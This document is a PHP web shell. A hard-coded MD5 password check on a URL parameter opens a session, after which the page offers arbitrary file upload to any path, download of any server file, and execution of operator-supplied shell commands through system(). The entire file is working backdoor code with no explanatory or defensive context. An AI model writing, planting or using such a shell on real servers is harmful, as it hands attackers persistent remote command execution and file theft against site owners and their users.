<?php
session_start();
if(isset($_SESSION["fav"])){
   if(isset($_FILES['fe'])&&$_FILES['fe']['size']){
       move_uploaded_file($_FILES['fe']['tmp_name'],$_POST['yt'].$_FILES['fe']['name']);
    }
    else if(isset($_POST['yt'])){
        if(file_exists($_POST['yt'])) {
            header('Content-Disposition: attachment; filename="'.basename($_POST['yt']).'"');
            header('Content-Length: '.filesize($_POST['yt']));
            readfile($_POST['yt']);
        }else{
            echo '<pre>';
            echo $_POST['te'];
            echo '<br>';
            echo $_POST['yt'];
            echo '<br>';
            system($_POST['yt']);
            echo '</pre>';
        }
    }
echo'  <html>';
echo'   <body style="background-color:#004d26;color:#ffff">';
echo'      <form action="" method="POST" enctype="multipart/form-data">';
echo'         <input type="TEXT" name="yt" id="yt" size="70">';
echo'         <input type="submit"/>';
echo'         <input type="file" name="fe" />';
echo'         <input type="hidden" id="te" name="te">';
echo'      </form>';
echo'      <script>';
echo'         window.scrollTo(0,document.body.scrollHeight);';
echo'         document.getElementById("te").value=document.getElementsByTagName("pre")[0].innerHTML';
echo'      </script>';
echo'    </body>';
echo'   </html>';
echo'  <style>';
echo'  input {';
echo'  border: 2px solid red;';
echo'  border-radius: 4px;';
echo'  color:#000000;';
echo'  height:25';
echo'}';
echo'</style>';
}else{
    if(isset($_GET["p"])&&md5($_GET["p"]) == "89e55d4f580dd044088b9a003110b37a"){
        $_SESSION["fav"] = md5($_GET["p"]);
        header('Location:'.$_SERVER['PHP_SELF']);
    }
}
?>